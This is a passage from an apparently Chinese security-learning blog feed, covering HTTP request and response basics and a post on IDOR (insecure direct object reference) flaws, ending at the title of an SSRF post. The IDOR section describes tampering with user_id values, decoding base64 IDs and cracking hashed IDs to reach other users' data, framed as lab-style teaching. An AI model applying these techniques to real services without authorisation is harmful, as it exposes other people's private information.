&lt;li&gt;**Query String:**可以发送到请求路径的额外信息位。例如，/blog？&lt;strong&gt;id=1&lt;/strong&gt; 将告知博客路径您希望接收 ID 为 1 的博客文章。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Fragment:&lt;/strong&gt; 这是对请求的实际页面上的位置的引用。这通常用于内容较长的页面，并且可以将页面的某个部分直接链接到该页面，因此用户一旦访问该页面即可查看该页面。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;提出请求&#34;&gt;提出请求
&lt;/h2&gt;&lt;p&gt;只需一行 &lt;strong&gt;GET / HTTP/1.1&lt;/strong&gt; 就可以向 Web 服务器发出请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319090147014.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;但要获得更丰富的 Web 体验，您还需要发送其他数据。这些其他数据以所谓的 headers 形式发送，其中 header 包含额外的信息，以提供给您正在与之通信的 Web 服务器，但我们将在 Header 任务中对此进行更多介绍。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;请求示例：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  GET / HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: tryhackme.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/5.0 Firefox/87.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Referer: https://tryhackme.com/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;第 1 行：&lt;/strong&gt; 此请求将发送 GET 方法（ 在 HTTP 方法 任务中，有更多相关信息），请求带有 / 的主页，并告知 Web 服务器我们使用的是 HTTP 协议版本 1.1。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 2 行：&lt;/strong&gt; 我们告诉 Web 服务器我们希望网站 tryhackme.com&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 3 行：&lt;/strong&gt; 我们告诉 Web 服务器我们使用的是 Firefox 版本 87 浏览器&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 4 行：&lt;/strong&gt; 我们告诉 Web 服务器，将我们引荐到此网页的网页是 &lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tryhackme.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;**第 5 行：**HTTP 请求始终以空行结尾，以通知 Web 服务器请求已完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;响应示例：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  HTTP/1.1 200 OK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Server: nginx/1.15.8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Date: Fri, 09 Apr 2021 13:34:03 GMT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: text/html
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 98
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;title&amp;gt;TryHackMe&amp;lt;/title&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Welcome To TryHackMe.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;第 1 行：&lt;/strong&gt; HTTP 1.1 是服务器正在使用的 HTTP 协议版本，然后是 HTTP 状态代码（在本例中为“200 Ok”），这告诉我们请求已成功完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 2 行：&lt;/strong&gt; 这告诉我们 Web 服务器软件和版本号。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 3 行：&lt;/strong&gt; Web 服务器的当前日期、时间和时区。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 4 行：&lt;/strong&gt; Content-Type 标头告诉客户端将发送哪种信息，例如 HTML、图像、视频、pdf、XML。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 5 行：&lt;/strong&gt; Content-Length 告诉客户端响应多长时间，这样我们就可以确认没有丢失数据&lt;/p&gt;
&lt;p&gt;**第 6 行：**HTTP 响应包含一个空行，用于确认 HTTP 响应的结束。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 7-14 行：&lt;/strong&gt; 已请求的信息，在本例中为主页。&lt;/p&gt;
&lt;h2 id=&#34;http方法&#34;&gt;HTTP方法
&lt;/h2&gt;&lt;h3 id=&#34;get-request&#34;&gt;GET Request
&lt;/h3&gt;&lt;p&gt;这用于从 Web 服务器获取信息。&lt;/p&gt;
&lt;h3 id=&#34;post-request&#34;&gt;POST Request
&lt;/h3&gt;&lt;p&gt;这用于将数据提交到 Web 服务器并可能创建新记录&lt;/p&gt;
&lt;h3 id=&#34;put-request&#34;&gt;PUT Request
&lt;/h3&gt;&lt;p&gt;这用于将数据提交到 Web 服务器以更新信息&lt;/p&gt;
&lt;h3 id=&#34;delete-request&#34;&gt;DELETE Request
&lt;/h3&gt;&lt;p&gt;这用于从 Web 服务器中删除信息/记录。&lt;/p&gt;
&lt;h2 id=&#34;http-协议状态代码&#34;&gt;HTTP 协议状态代码：
&lt;/h2&gt;&lt;p&gt;在上一个任务中，您了解到，当 HTTP 服务器响应时，第一行始终包含一个状态代码，告知客户端其请求的结果以及可能如何处理该请求。这些状态代码可以分为 5 个不同的范围：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;100-199 - Information Response 100-199 - 信息响应&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;发送这些请求是为了告诉客户端其请求的第一部分已被接受，他们应该继续发送请求的其余部分。这些代码不再很常见。&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;200-299 - 成功&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;此状态代码范围用于告诉客户端其请求成功。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;300-399 - 重定向&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;这些用于将客户端的请求重定向到另一个资源。这可以是不同的网页，也可以是完全不同的网站。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;400-499 - Client Errors 400-499 - 客户端错误&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;用于通知客户端其请求有错误。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;500-599 - 服务器错误&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;这是为服务器端发生的错误保留的，通常表示处理请求的服务器存在相当大的问题。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;常见的-http-状态代码&#34;&gt;常见的 HTTP 状态代码：
&lt;/h2&gt;&lt;p&gt;有很多不同的 HTTP 状态代码，这还不包括应用程序甚至可以定义自己的 HTTP 状态代码，我们将介绍您可能遇到的最常见的 HTTP 响应：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;200 - OK 200 - 正常&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;请求已成功完成。&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;201 - Created 201 - 已创建&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;已创建资源（例如，新用户或新博客文章）。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;301 - Moved Permanently 301 - 永久移动&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;这会将客户的浏览器重定向到新网页，或告诉搜索引擎该页面已移至其他位置并改为查看那里。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;302 - Found 302 - 找到&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;与上述永久重定向类似，但顾名思义，这只是一个临时更改，在不久的将来可能会再次更改。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;400 - Bad Request 400 - 错误请求&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;这会告诉浏览器他们的请求中有错误或缺失。如果请求的 Web 服务器资源需要客户端未发送的特定参数，则有时可以使用此方法。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;401 - Not Authorised 401 - 未授权&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;在您授权 Web 应用程序（通常是使用用户名和密码）之前，您当前不允许查看此资源。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;403 - Forbidden 403 - 禁止&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;无论您是否登录，您都无权查看此资源。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;405 - Method Not Allowed 405 - 不允许使用&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;资源不允许此方法请求，例如，当资源需要 POST 请求时，您向资源 /create-account 发送 GET 请求。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;404 - Page Not Found 404 - 未找到页面&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;您请求的页面/资源不存在。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;500 - Internal Service Error 500 - 内部服务错误&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;服务器在您的请求中遇到了某种错误，它不知道如何正确处理。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;503 - Service Unavailable 503 - 服务不可用&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;此服务器无法处理您的请求，因为它已过载或停机进行维护。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;headers-头&#34;&gt;Headers 头
&lt;/h2&gt;&lt;p&gt;标头是您在发出请求时可以发送到 Web 服务器的附加数据位。&lt;/p&gt;
&lt;p&gt;尽管在发出 HTTP 请求时不严格要求标头，但您会发现很难正确查看网站。&lt;/p&gt;
&lt;h3 id=&#34;通用请求标头&#34;&gt;通用请求标头
&lt;/h3&gt;&lt;p&gt;这些是从客户端（通常是您的浏览器）发送到服务器的标头。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Host:&lt;/strong&gt; 一些 Web 服务器托管多个网站，因此通过提供主机标头，您可以告诉它您需要哪个网站，否则您只会收到服务器的默认网站。&lt;/p&gt;
&lt;p&gt;**User-Agent:**这是您的浏览器软件和版本号，告诉 Web 服务器您的浏览器软件有助于它为您的浏览器正确格式化网站，并且 HTML、JavaScript 和 CSS 的某些元素仅在某些浏览器中可用。&lt;/p&gt;
&lt;p&gt;**Content-Length:**将数据发送到 Web 服务器（例如在表单中）时，内容长度会告知 Web 服务器 Web 请求中预期有多少数据。这样，服务器可以确保它不会丢失任何数据。&lt;/p&gt;
&lt;p&gt;**Accept-Encoding:**告诉 Web 服务器浏览器支持哪些类型的压缩方法，以便可以缩小数据以通过 Internet 传输。&lt;/p&gt;
&lt;p&gt;**Cookie:**发送到服务器以帮助记住您的信息的数据（有关更多信息，请参阅 Cookie 任务）。&lt;/p&gt;
&lt;h3 id=&#34;常见响应标头&#34;&gt;常见响应标头
&lt;/h3&gt;&lt;p&gt;这些是在请求后从服务器返回给客户端的标头。&lt;/p&gt;
&lt;p&gt;**Set-Cookie:**要存储的信息将在每个请求中发送回 Web 服务器（请参阅 cookie 任务以了解更多信息）。&lt;/p&gt;
&lt;p&gt;**Cache-Control:**在浏览器再次请求响应之前，将响应内容存储在浏览器的缓存中多长时间。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Type:&lt;/strong&gt; 这会告诉客户端返回什么类型的数据，即 HTML、CSS、JavaScript、图像、PDF、视频等。使用 content-type 标头，浏览器就可以知道如何处理数据。&lt;/p&gt;
&lt;p&gt;**Content-Encoding:**通过 Internet 发送数据时，使用了什么方法来压缩数据以使其更小。&lt;/p&gt;
&lt;h2 id=&#34;cookies&#34;&gt;Cookies
&lt;/h2&gt;&lt;p&gt;它们只是存储在您计算机上的一小段数据。当您从 Web 服务器收到 “Set-Cookie” 标头时，将保存 Cookie。然后，您发出的每个进一步请求，您都会将 cookie 数据发送回 Web 服务器。由于 HTTP 是无状态的（不会跟踪您以前的请求），因此 cookie 可用于提醒 Web 服务器您是谁、网站的一些个人设置或您以前是否访问过该网站。让我们看一下这个 HTTP 请求示例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319090916336.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;Cookie 可用于多种用途，但最常用于网站身份验证。cookie 值通常不是您可以看到密码的明文字符串，而是令牌（人类不容易猜到的唯一密码）。&lt;/p&gt;
&lt;h3 id=&#34;查看您的-cookie&#34;&gt;查看您的 Cookie
&lt;/h3&gt;&lt;p&gt;您可以在浏览器中使用开发人员工具轻松查看浏览器向网站发送的 Cookie。&lt;/p&gt;
&lt;p&gt;打开开发人员工具后，单击“Network”（网络）选项卡。此选项卡将向您显示浏览器请求的所有资源的列表。您可以单击每个选项以接收请求和响应的详细分类。如果您的浏览器发送了 Cookie，您将在请求的“Cookie”选项卡上看到这些 Cookie。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>IDOR基础</title>
        <link>https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/54afbc538832e9159efdc2ac951b4fabecad8304bd717a9aece08e26440c0690.png" alt="Featured image of post IDOR基础" /&gt;&lt;h1 id=&#34;idor基础&#34;&gt;IDOR基础
&lt;/h1&gt;&lt;h2 id=&#34;什么是idor&#34;&gt;什么是IDOR
&lt;/h2&gt;&lt;p&gt;IDOR（ Insecure Direct Object Reference） 代表不安全的直接对象引用，是一种访问控制漏洞。&lt;/p&gt;
&lt;p&gt;当 Web 服务器收到用户提供的输入以检索对象（文件、数据、文档），对输入数据给予了太多信任，并且未在服务器端对其进行验证以确认所请求的对象属于请求它的用户时，就会发生这种类型的漏洞。&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例
&lt;/h2&gt;&lt;p&gt;假设您刚刚注册了一项在线服务，并且想要更改您的个人资料信息。您单击的链接将转到 &lt;a class=&#34;link&#34; href=&#34;http://online-service.thm/profile?user_id=1305&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://online-service.thm/profile?user_id=1305&lt;/a&gt;，您可以看到您的信息。&lt;/p&gt;
&lt;p&gt;好奇心让您尝试将 user_id 值更改为 1000 （http://online-service.thm/profile?user_id=1000），令您惊讶的是，您现在可以看到其他用户的信息。您现在发现了一个 IDOR 漏洞！理想情况下，应该在网站上进行检查，以确认用户信息属于请求它的用户。&lt;/p&gt;
&lt;h2 id=&#34;在编码中发现idor&#34;&gt;在编码中发现IDOR
&lt;/h2&gt;&lt;p&gt;当通过帖子数据、查询字符串或 cookie 将数据从一个页面传递到另一个页面时，Web 开发人员通常首先会获取原始数据并对其进行编码。编码可确保接收 Web 服务器能够理解内容。编码将二进制数据转换为 ASCII 字符串，通常使用 &lt;code&gt;a-z、A-Z、0-9 和 = &lt;/code&gt;字符 用于填充。Web 上最常见的编码技术是 base64 编码，通常很容易被发现。您可以使用网站 Like &lt;a class=&#34;link&#34; href=&#34;https://www.base64decode.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.base64decode.org/&lt;/a&gt; 解码字符串，然后编辑数据并使用 &lt;a class=&#34;link&#34; href=&#34;https://www.base64encode.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.base64encode.org/&lt;/a&gt; 再次重新编码，然后重新提交 Web 请求以查看响应是否有更改。&lt;/p&gt;
&lt;p&gt;请参阅下图作为此过程的图形示例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319134915800.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;哈希idor&#34;&gt;哈希IDOR
&lt;/h2&gt;&lt;p&gt;散 列 ID 比编码的 ID 要复杂一些，但它们可能遵循可预测的模式，例如是整数值的哈希版本。例如，如果使用 md5 哈希，则 ID 号 123 将变为 202cb962ac59075b964b07152d234b70。&lt;/p&gt;
&lt;p&gt;值得将任何发现的哈希值通过 Web 服务，例如 &lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://crackstation.net/&lt;/a&gt;（它有一个包含数十亿个 hash to value 结果的数据库），看看我们是否能找到任何匹配项。&lt;/p&gt;
&lt;h2 id=&#34;unpredictable-ids&#34;&gt;Unpredictable IDs
&lt;/h2&gt;&lt;p&gt;如果使用上述方法无法检测到 ID，则 IDOR 检测的一个很好的方法是创建两个帐户并在它们之间交换 ID 号。如果您可以使用其他用户的 ID 号查看其他用户的内容，同时仍然使用其他账户登录（或根本未登录），则您发现了有效的 IDOR 漏洞。&lt;/p&gt;
&lt;h2 id=&#34;idor在哪里&#34;&gt;IDOR在哪里
&lt;/h2&gt;&lt;p&gt;您所针对的易受攻击的终端节点可能并不总是您在地址栏中看到的。它可能是您的浏览器通过 AJAX 请求加载的内容，或者您在 JavaScript 文件中找到引用的内容。&lt;/p&gt;
&lt;p&gt;有时，终端节点可能有一个未引用的参数，该参数可能在开发过程中有所用处，并被推送到生产环境中。例如，您可能会注意到对 &lt;strong&gt;/user/details&lt;/strong&gt; 的调用显示您的用户信息（通过您的会话进行身份验证）。但是通过一种称为参数挖掘的攻击，您发现了一个名为 &lt;strong&gt;user_id&lt;/strong&gt; 的参数，您可以使用它来显示其他用户的信息，例如 &lt;strong&gt;/user/details？user_id=123&lt;/strong&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SSRF基础</title>
        <link>https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/</guid>
